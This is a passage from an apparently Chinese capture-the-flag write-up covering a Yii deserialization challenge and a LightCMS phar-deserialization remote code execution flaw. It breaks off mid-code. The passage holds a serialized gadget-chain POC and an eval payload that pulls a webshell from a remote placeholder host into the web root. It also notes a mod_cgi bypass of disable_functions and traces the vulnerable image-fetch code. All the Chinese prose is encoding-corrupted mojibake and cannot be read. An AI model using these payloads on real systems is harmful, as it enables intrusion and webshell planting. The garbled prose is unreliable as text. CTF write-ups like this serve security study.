&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¯¥POCï¼Œå¾—åˆ° disable_functions ï¼Œè¿™é‡Œæ³¨æ„ä¸‹ï¼Œç”±äºæœ‰ disable_functionsã€‚æ‰€ä»¥åœ¨ pocä¸Šæ— è„‘å†²å‘½ä»¤æ‰§è¡Œçš„å°†ä¼šå¾—åˆ°æŠ¥é”™å›æ˜¾ã€‚ã€‚ã€‚è¿™å¯ä¸æ˜¯ååºåˆ—åŒ–é“¾å­é”™äº†ã€‚ã€‚è€Œæ˜¯å‡½æ•°è¢«ç¦ç”¨äº†ã€‚ã€‚</p><br><p><strong>disable_functionså†…å®¹ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl,mail,putenv,error_log,error_reporting,<span class="keyword">unset</span>,unlink,<span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>ç»è¿‡äº†å¤šæ¬¡æµ‹è¯•åï¼Œå¾—åˆ°è¿™ç©æ„æœ‰ä¸¤ä¸ªå‘ï¼š</p><ol><li>ä½¿ç”¨ <code>assert(eval())</code> å½¢å¼æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œæ³¨æ„ eval é‡Œçš„è¯­å¥æœ€åè¦æ‰‹åŠ¨åŠ ä¸ª <code>die()</code>ï¼Œä¸ç„¶ä¼šä½¿å¾—ç¨‹åºç»§ç»­æ‰§è¡Œè€ŒæŠ¥é”™</li><li>ç›´æ¥å†™shellï¼Œè¯¥ç¨‹åºä¼šè‡ªåŠ¨å°†æ–‡ä»¶å†… $ åé¢çš„å­—ç¬¦å…¨éƒ¨åˆ å»ï¼Œå¯¼è‡´æ— æ³•ç›´æ¥å†™shellï¼Œä½†å¯ä»¥é€šè¿‡ php çš„ copy å‡½æ•°ä» vps ä¸ŠæŠŠshellæ‰’æ‹‰ä¸‹æ¥</li></ol><br><p><strong>ä¿®æ”¹POCï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="comment">//è¿™é‡Œçš„Webç›®å½•å¯ä»¥æ ¹æ®å‰é¢çš„ phpinfo å¾—çŸ¥</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;eval(\&#x27;var_dump(copy(&quot;https://xxx.com/11.txt&quot;,&quot;/var/www/html/web/122.php&quot;));die();\&#x27;);&#x27;</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><br><p>ä¸Šshellåï¼Œåœ¨ / ç›®å½•ä¸‹å‘ç° readflag æ–‡ä»¶ã€‚æŸ¥çœ‹æƒé™å‘ç°æ˜¯ 003 æ˜¯ wx æƒé™ï¼Œæ²¡ræƒé™ã€‚è¯´æ˜æˆ‘ä»¬éœ€è¦æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶æ‰èƒ½è·å– flagã€‚  </p><br><p>ç”±äº putenv è¢«ç¦ç”¨äº†æˆ‘ä»¬ä¸å¯èƒ½ä½¿ç”¨ LD_PRELOAD æ¥ Bypass disable_function ã€‚é€šè¿‡æŸ¥çœ‹ apacheé…ç½®æ–‡ä»¶å¯çŸ¥ï¼Œ.htaccess å¼€ç€ï¼Œå¹¶ä¸”mod_cgi ä¹Ÿå¼€ç€ã€‚æƒ³åˆ°ä¹Ÿè®¸èƒ½é€šè¿‡ .htaccessæ¥æŒ‡å®šåŠ è½½å¦å¤–ä¸€ä¸ª php.iniã€‚æœ¬ä»¥ä¸ºæ˜¯å²æ— å‰ä¾‹çš„å‘ç°ï¼Œç™¾åº¦äº†æ‰å‘ç°åŸæ¥æ˜¯äººå°½çš†çŸ¥çš„ä¸œè¥¿ã€‚ã€‚ã€‚ã€‚==</p><br><p><strong>httpd.conf</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LoadModule cgi_module modules/mod_cgi.so</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">&lt;<span class="built_in">Directory</span> <span class="string">&quot;/var/www/html/web/&quot;</span>&gt;</span><br><span class="line">    AllowOverride All</span><br><span class="line">    <span class="comment"># Allow open access:</span></span><br><span class="line">    <span class="keyword">Require</span> all granted</span><br><span class="line">&lt;/<span class="built_in">Directory</span>&gt;</span><br></pre></td></tr></table></figure><br><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨  Apache Mod CGI æ¥ bypassï¼Œå›¾çœäº‹ç›´æ¥ç”¨èšå‰‘æ’ä»¶ã€‚ã€‚è¿™é‡ŒæŒ–ä¸ªå‘ï¼Œè¿‡æ®µæ—¶é—´æ²¡äº‹å¹²äº†å»ç ”ç©¶ä¸‹ bypass disable_functions çš„åŸç†ã€‚ã€‚ç¿»æ‰¾æ–‡ç« çš„æ—¶å€™å‘ç°äº† <a href="https://blog.csdn.net/rfrder/article/details/109078117">ä¸€ç¯‡æ–‡</a> æ„Ÿè§‰å†™çš„è¿˜å¯ä»¥ã€‚</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1.png" width="600px"><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/2.png" width="600px"><br><h1 id="WEB4-LightCMS-0day"><a href="#WEB4-LightCMS-0day" class="headerlink" title="WEB4 - LightCMS 0day"></a>WEB4 - LightCMS 0day</h1><p><a href="https://igml.top/2021/05/10/lightcms-RCE/#more">å‚è€ƒåŸæ–‡</a></p><p>LightCMS æ˜¯åŸºäº Laravel æ¡†æ¶çš„ä¸€ä¸ªCMSã€‚ç›®å‰çš„æœ€æ–°ç‰ˆ v1.3.7 åŸºäº Laravel 6.x å¼€å‘ï¼ŒPHP&gt;=7.2ã€‚</p><p><strong>æŒ–æ˜æ€è·¯ï¼š</strong></p><ol><li>æœç´¢å¾—åˆ° LightCMS çš„å†å²æ¼æ´ <a href="https://github.com/eddy8/LightCMS/issues/19">RCE in â€œcatchImageâ€</a>â€˜  (CVE-2021-27112)</li><li>å¾—çŸ¥LightCMSå¯ä»¥ä¸Šä¼ è¿œç¨‹æ–‡ä»¶</li><li><strong>è‹¥</strong> è§£æè¿œç¨‹æ–‡ä»¶æ—¶å­˜åœ¨æ–‡ä»¶å‡½æ•°ï¼ŒPHP&lt;8 å¯è§¦å‘ phar ååºåˆ—åŒ–</li><li>åœ¨ phpggc ä¸­æœ‰ Laravel 6.x çš„é“¾å­</li></ol><p>æŒ‰ç€è¿™ä¸ªæ€è·¯ï¼Œæˆ‘ä»¬é‡ç‚¹è°ƒè¯•ä¸Šä¼ è¿œç¨‹æ–‡ä»¶æ—¶çš„ä»£ç å³å¯ã€‚ï¼ˆè¿™äº›éƒ½æ˜¯åé¢çœ‹äº†wpæ‰å¾—å‡ºçš„ç»“è®º==ï¼Œå½“æ—¶æ ¹æœ¬æ²¡æœ‰æƒ³åˆ° Pharååºåˆ—åŒ–å’Œ æ–‡ä»¶ä¸Šä¼ ç»“åˆèµ·æ¥ã€‚ã€‚ã€‚æœç„¶è¿˜æ˜¯å¤ªèœäº†ï¼‰</p><h2 id="è¡¥å……ç‚¹-Laravel-çš„çŸ¥è¯†"><a href="#è¡¥å……ç‚¹-Laravel-çš„çŸ¥è¯†" class="headerlink" title="è¡¥å……ç‚¹ Laravel çš„çŸ¥è¯†"></a>è¡¥å……ç‚¹ Laravel çš„çŸ¥è¯†</h2><p>ç”±äºä¹‹å‰æ²¡æ€ä¹ˆæ‘¸è¿‡ Laravelï¼Œè¿™é‡Œæä¸€ç‚¹ Laravelçš„åŸºæœ¬çŸ¥è¯†ï¼Œæœ‰åŠ©äºç†è§£è¿™ä¸ªæ¼æ´</p><h3 id="è·¯ç”±ã€æ§åˆ¶å™¨"><a href="#è·¯ç”±ã€æ§åˆ¶å™¨" class="headerlink" title="è·¯ç”±ã€æ§åˆ¶å™¨"></a>è·¯ç”±ã€æ§åˆ¶å™¨</h3><p>è·¯ç”±æ–‡ä»¶ä½ç½®ï¼š <strong>/routes</strong></p><p>æ§åˆ¶å™¨æ–‡ä»¶ä½ç½®ï¼š**/app/Http/Controllers**</p><p>/app/Http ç›®å½•ç»“æ„ï¼š</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-1.png" width="300px"><p><strong>è·¯ç”±</strong></p><p>è·¯ç”±æ–‡ä»¶ä¼šè¢« <code>App\Providers\RouteServiceProvider</code> è‡ªåŠ¨åŠ è½½ã€‚å¯ä»¥åœ¨è¯¥æ–‡ä»¶ä¸­æ·»åŠ è·¯ç”±æ–‡ä»¶ã€‚æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//api å’Œ web æ˜¯é»˜è®¤å°±æœ‰çš„</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;mapApiRoutes();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mapWebRoutes();</span><br><span class="line">    <span class="comment">//admin å’Œ member æ˜¯ LightCMS è‡ªå·±åŠ çš„</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;mapAdminRoutes();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mapMemberRoutes();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//éœ€è¦å†™å¯¹åº”è·¯ç”±æ–‡ä»¶çš„è·¯ç”±</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mapAdminRoutes</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Route::prefix(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        -&gt;middleware(<span class="string">&#x27;web&#x27;</span>)</span><br><span class="line">        <span class="comment">//è·¯ç”±æ–‡ä»¶å¯¹åº”çš„æ¨¡å—ä½ç½®</span></span><br><span class="line">        -&gt;namespace(<span class="keyword">$this</span>-&gt;namespace . <span class="string">&#x27;\Admin&#x27;</span>)</span><br><span class="line">        <span class="comment">//è·¯ç”±æ–‡ä»¶ä½ç½®</span></span><br><span class="line">        -&gt;group(base_path(<span class="string">&#x27;routes/admin.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>çŸ¥é“äº†æœ‰å“ªäº›è·¯ç”±æ–‡ä»¶è¢«åŠ è½½åï¼Œæˆ‘ä»¬ç›´æ¥çœ‹å¯¹åº”çš„è·¯ç”±æ–‡ä»¶ (<code>routes/admin.php</code>)ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Route::group(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;as&#x27;</span> =&gt; <span class="string">&#x27;admin::&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        .....   </span><br><span class="line">        Route::middleware(<span class="string">&#x27;log:admin&#x27;</span>, <span class="string">&#x27;auth:admin&#x27;</span>, <span class="string">&#x27;authorization:admin&#x27;</span>)-&gt;group(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">//1. POSTè¯·æ±‚æ‰ä¼šæ‰§è¡Œè¯¥è·¯ç”±</span></span><br><span class="line">            <span class="comment">//2. è·¯ç”± url æ ¼å¼ä¸º /neditor/serve/ã€‚&#123;type&#125; è¡¨ç¤ºå‚æ•°</span></span><br><span class="line">            <span class="comment">//3. NEditorController@serve å¯¹åº” /app/Http/Controllers/Admin/NEditorController.php çš„  serve() æ–¹æ³•</span></span><br><span class="line">            Route::post(<span class="string">&#x27;/neditor/serve/&#123;type&#125;&#x27;</span>, <span class="string">&#x27;NEditorController@serve&#x27;</span>)-&gt;name(<span class="string">&#x27;neditor.serve&#x27;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>ç»¼ä¸Šå¯çŸ¥å‘é€ POSTæ ¼å¼çš„ <code>admin/neditor/serve/xxx</code> ä¼šè¢«è·¯ç”±åˆ° <code>/app/Http/Controllers/Admin/NEditorController.php</code> çš„<code>serve()</code>æ–¹æ³•ã€‚è¿™ä¸ªphpæ–‡ä»¶å°±æ˜¯å¼€å‘è€…è‡ªå·±å†™çš„å¤„ç†ä¸šåŠ¡é€»è¾‘çš„æ–‡ä»¶äº†</p><p>æŸ¥çœ‹ <code>serve()</code>æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è¿™é‡Œçš„ $type å¯¹åº”è·¯ç”±ä¸­å®šä¹‰çš„å‚æ•° &#123;type&#125;</span></span><br><span class="line"><span class="comment">//å³å‘é€è¯·æ±‚ admin/neditor/serve/xxx æ—¶ï¼Œ$typeå€¼ä¸º xxx</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serve</span>(<span class="params">Request <span class="variable">$request</span>, <span class="variable">$type</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!method_exists(<span class="built_in">self</span>::class, <span class="variable">$type</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;æœªçŸ¥æ“ä½œ&#x27;</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//æ ¹æ®ä¼ å…¥$typeè°ƒç”¨æœ¬ç±»åŒåæ–¹æ³•</span></span><br><span class="line">    <span class="keyword">return</span> call_user_func(<span class="built_in">self</span>::class . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$type</span>, <span class="variable">$request</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´é€»è¾‘"><a href="#æ¼æ´é€»è¾‘" class="headerlink" title="æ¼æ´é€»è¾‘"></a>æ¼æ´é€»è¾‘</h2><p>æ ¹æ® CVE-2021-27112 çš„æ¼æ´ç‚¹ï¼Œå®šä½åˆ° <code>NEditorController.php</code> çš„ <code>catchImage()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">catchImage</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$files</span> = array_unique((<span class="keyword">array</span>) <span class="variable">$request</span>-&gt;post(<span class="string">&#x27;file&#x27;</span>));</span><br><span class="line">    <span class="variable">$urls</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//è§£æ$_POST[&#x27;file&#x27;]ï¼Œè¿›è¡Œè¿œç¨‹æ–‡ä»¶æ‹‰å–</span></span><br><span class="line">        <span class="comment">//!! é‡ç‚¹è·Ÿè¿›è¯¥æ–¹æ³• !!</span></span><br><span class="line">        <span class="variable">$image</span> = <span class="keyword">$this</span>-&gt;fetchImageFile(<span class="variable">$v</span>);</span><br><span class="line">        <span class="comment">//!! é‡ç‚¹è·Ÿè¿›è¯¥æ–¹æ³• !!</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//CVE-2021-27112è¡¥ä¸ï¼Œæ ¡éªŒè¿œç¨‹æ–‡ä»¶åˆæ³•æ€§</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$image</span> || !<span class="variable">$image</span>[<span class="string">&#x27;extension&#x27;</span>] || !<span class="keyword">$this</span>-&gt;isAllowedImageType(<span class="variable">$image</span>[<span class="string">&#x27;extension&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$path</span> = date(<span class="string">&#x27;Ym&#x27;</span>) . <span class="string">&#x27;/&#x27;</span> . md5(<span class="variable">$v</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$image</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">        <span class="comment">//ä¿å­˜æ–‡ä»¶</span></span><br><span class="line">        Storage::disk(config(<span class="string">&#x27;light.neditor.disk&#x27;</span>))</span><br><span class="line">            -&gt;put(<span class="variable">$path</span>, <span class="variable">$image</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//è¿”å›ä¿å­˜æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">        <span class="variable">$urls</span>[] = [</span><br><span class="line">            <span class="string">&#x27;url&#x27;</span> =&gt; Storage::disk(config(<span class="string">&#x27;light.neditor.disk&#x27;</span>))-&gt;url(<span class="variable">$path</span>),</span><br><span class="line">            <span class="string">&#x27;source&#x27;</span> =&gt; <span class="variable">$v</span>,</span><br><span class="line">            <span class="string">&#x27;state&#x27;</span> =&gt; <span class="string">&#x27;SUCCESS&#x27;</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">&#x27;list&#x27;</span> =&gt; <span class="variable">$urls</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿› <code>fetchImageFile()</code> æ–¹æ³•ã€‚è¯¥æ–¹æ³•å¯ç®€åŒ–æˆå¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchImageFile</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//æ‹‰å–è¿œç¨‹æ–‡ä»¶</span></span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    <span class="variable">$options</span> =  [</span><br><span class="line">        CURLOPT_URL =&gt; <span class="variable">$url</span>,</span><br><span class="line">        CURLOPT_RETURNTRANSFER =&gt; <span class="literal">true</span>,</span><br><span class="line">        CURLOPT_USERAGENT =&gt; <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    curl_setopt_array(<span class="variable">$ch</span>, <span class="variable">$options</span>);</span><br><span class="line">    <span class="comment">//$dataä¸ºè¿œç¨‹æ–‡ä»¶å†…å®¹</span></span><br><span class="line">    <span class="variable">$data</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// !!é‡ç‚¹æ–¹æ³•!!</span></span><br><span class="line"><span class="variable">$image</span> = Image::make(<span class="variable">$data</span>);</span><br><span class="line">    <span class="comment">// !!é‡ç‚¹æ–¹æ³•!!</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//è·å–æ–‡ä»¶çš„MIMEç±»å‹</span></span><br><span class="line">    <span class="variable">$mime</span> = <span class="variable">$image</span>-&gt;mime();</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">&#x27;extension&#x27;</span> =&gt; <span class="variable">$extension</span> ?? (<span class="variable">$mime</span> ? strtolower(explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$mime</span>)[<span class="number">1</span>]) : <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Image æ˜¯ä¸€ä¸ª Facadeã€‚å…·ä½“çš„ Facadeé€»è¾‘å¯ä»¥æš‚æ—¶ä¸ç”¨ç†ä¼šï¼Œåªéœ€çŸ¥é“ Facade çš„ <code>__callStatic()</code> æœ‰ä¸€æ®µä»£ç  <code>$instance-&gt;$method(...$args);</code> å³å¯ã€‚</p><p><code>Image::make()</code> æœ€ç»ˆè°ƒç”¨äº† <code>Intervention\Image\ImageManager make()</code> æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Intervention\Image\ImageManager</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//createDriver()å°†å®ä¾‹åŒ–Intervention\Image\Gd\Driverç±»å¹¶è¿”å›</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;createDriver()-&gt;init(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line">Intervention\Image\Gd\Driver <span class="keyword">extends</span> \Intervention\Image\AbstractDriver</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Decoder <span class="variable">$decoder</span> = <span class="literal">null</span>, Encoder <span class="variable">$encoder</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ....</span><br><span class="line">    <span class="comment">//æ‰§è¡Œå®Œè¿™ä¸ª __construct() åï¼Œä¼šè‡ªåŠ¨æ‰§è¡ŒæŠ½è±¡çˆ¶ç±» AbstractDriver çš„ init()æ–¹æ³•</span></span><br><span class="line">    <span class="comment">//å…·ä½“å¥½åƒæ˜¯PHPçš„æŸä¸ªæœºåˆ¶ä½¿å¾—å…¶ä¼šè‡ªåŠ¨è°ƒç”¨init()ã€‚è¿˜æ²¡æ·±ç©¶</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;decoder = <span class="variable">$decoder</span> ? <span class="variable">$decoder</span> : <span class="keyword">new</span> Decoder;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;encoder = <span class="variable">$encoder</span> ? <span class="variable">$encoder</span> : <span class="keyword">new</span> Encoder;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line">Intervention\Image\AbstractDriver</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;decoder-&gt;init(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line">Intervention\Image\AbstractDecoder</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line"><span class="comment">//æ ¹æ®è¿œç¨‹æ–‡ä»¶çš„å†…å®¹ï¼Œæ‰§è¡Œä¸ä¸€æ ·çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        .....</span><br><span class="line">        <span class="comment">//ä¸Šä¼ æ–‡ä»¶æ˜¯å›¾ç‰‡ï¼ˆäºŒè¿›åˆ¶æ•°æ®ï¼‰ï¼Œåˆ™ä¸ºtrue</span></span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">$this</span>-&gt;isBinary():</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;initFromBinary(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">        <span class="comment">//è‹¥æ–‡ä»¶å†…å®¹æ˜¯ä¸€ä¸²urlï¼Œåˆ™ä¸ºtrue</span></span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">$this</span>-&gt;isUrl():</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;initFromUrl(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    